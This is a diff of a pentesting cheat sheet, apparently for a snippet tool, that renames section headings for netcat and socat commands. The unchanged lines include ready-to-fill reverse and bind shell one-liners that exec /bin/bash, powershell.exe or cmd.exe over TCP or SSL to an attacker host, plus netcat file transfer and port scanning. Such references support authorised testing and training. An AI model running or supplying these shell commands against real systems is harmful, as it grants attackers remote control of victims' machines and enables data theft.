@@ -6,7 +6,7 @@
 
 ---
 
-## nc - Listener (Catch Reverse Shell)
+## listen catch reverse shell
 Start a netcat listener to catch incoming reverse shell connections.
 
 ```bash
@@ -17,7 +17,7 @@ nc -lvnp {{LPORT:port:4444}}
 
 ---
 
-## nc - Connect to a Port
+## connect remote port
 Connect to an open port on a remote host.
 
 ```bash
@@ -28,7 +28,7 @@ nc -nv {{TARGET:ip}} {{PORT:port:80}}
 
 ---
 
-## nc - Bind Shell Connect
+## connect bind shell
 Connect to a bind shell already running on a target.
 
 ```bash
@@ -39,7 +39,7 @@ nc -nv {{TARGET:ip}} {{PORT:port:4444}}
 
 ---
 
-## ncat - SSL Encrypted Listener
+## listen ncat ssl encrypted
 Start an encrypted listener using Ncat with SSL.
 
 ```bash
@@ -50,7 +50,7 @@ ncat --ssl -lvnp {{LPORT:port:4444}}
 
 ---
 
-## socat - Bind Shell (Listener on Target)
+## listen socat bind shell
 Create a bind shell on the target that waits for connections.
 
 ```bash
@@ -61,7 +61,7 @@ socat TCP-LISTEN:{{LPORT:port:4444}},reuseaddr,fork EXEC:/bin/bash,pty,stderr,se
 
 ---
 
-## socat - Reverse Shell (From Target to Attacker)
+## socat reverse shell
 Send a reverse shell from the target back to the attacker.
 
 ```bash
@@ -72,7 +72,7 @@ socat TCP:{{LHOST:ip}}:{{LPORT:port:4444}} EXEC:/bin/bash,pty,stderr,setsid,sigi
 
 ---
 
-## socat - Catch Reverse Shell (Attacker Listener)
+## listen socat reverse shell tty
 Listen for an incoming socat reverse shell with a full TTY.
 
 ```bash
@@ -83,7 +83,7 @@ socat FILE:`tty`,raw,echo=0 TCP-LISTEN:{{LPORT:port:4444}}
 
 ---
 
-## socat - Port Forward
+## forward socat tcp port
 Forward traffic from a local port to a remote host and port.
 
 ```bash
@@ -94,7 +94,7 @@ socat TCP-LISTEN:{{LPORT:port:8080}},fork TCP:{{TARGET:ip}}:{{RPORT:port:80}}
 
 ---
 
-## socat - Encrypted Shell with SSL
+## listen socat ssl reverse shell
 Create an encrypted reverse shell using OpenSSL certificates.
 
 ```bash
@@ -105,7 +105,7 @@ socat OPENSSL-LISTEN:{{LPORT:port:4443}},cert={{CERT:file:shell.pem}},verify=0,r
 
 ---
 
-## nc - BSD Listener (No -p Flag)
+## listen bsd netcat
 Minimal BSD netcat listener for environments that lack GNU-style flags.
 
 ```bash
@@ -116,7 +116,7 @@ nc -l {{LPORT:port:4444}}
 
 ---
 
-## nc - Send File
+## send file
 Pipe a file to a waiting listener on the remote host.
 
 ```bash
@@ -127,7 +127,7 @@ nc {{TARGET:ip}} {{PORT:port:4444}} < {{FILE:file}}
 
 ---
 
-## nc - Receive File
+## receive file
 Listen for an incoming file stream and write it to disk.
 
 ```bash
@@ -138,7 +138,7 @@ nc -lvnp {{LPORT:port:4444}} > {{OUTFILE:file:recv.bin}}
 
 ---
 
-## nc - Port Scan (No Nmap)
+## scan ports no nmap
 Sweep a port range with netcat when nmap is unavailable.
 
 ```bash
@@ -149,7 +149,7 @@ nc -zv {{TARGET:ip}} {{PORTS:str:1-1000}}
 
 ---
 
-## socat - Windows Reverse Shell via PowerShell
+## socat windows powershell reverse shell
 Spawn a Windows reverse shell calling powershell.exe with pipes.
 
 ```bash
@@ -160,7 +160,7 @@ socat TCP:{{LHOST:ip}}:{{LPORT:port:4444}} EXEC:powershell.exe,pipes
 
 ---
 
-## socat - Encrypted Cert Generation
+## generate socat ssl cert
 Generate a self-signed certificate for encrypted socat shells.
 
 ```bash
@@ -171,7 +171,7 @@ openssl req -newkey rsa:2048 -nodes -keyout {{KEY:file:shell.key}} -x509 -days 3
 
 ---
 
-## socat - OPENSSL Connect to Encrypted Listener
+## connect socat ssl listener
 Connect from the target back to an encrypted socat listener.
 
 ```bash
@@ -182,7 +182,7 @@ socat OPENSSL:{{LHOST:ip}}:{{LPORT:port:4443}},verify=0 EXEC:/bin/bash
 
 ---
 
-## socat - Encrypted Windows Bind Shell
+## listen socat ssl windows bind shell
 Listen on the target with SSL and exec cmd.exe for incoming attackers.
 
 ```bash
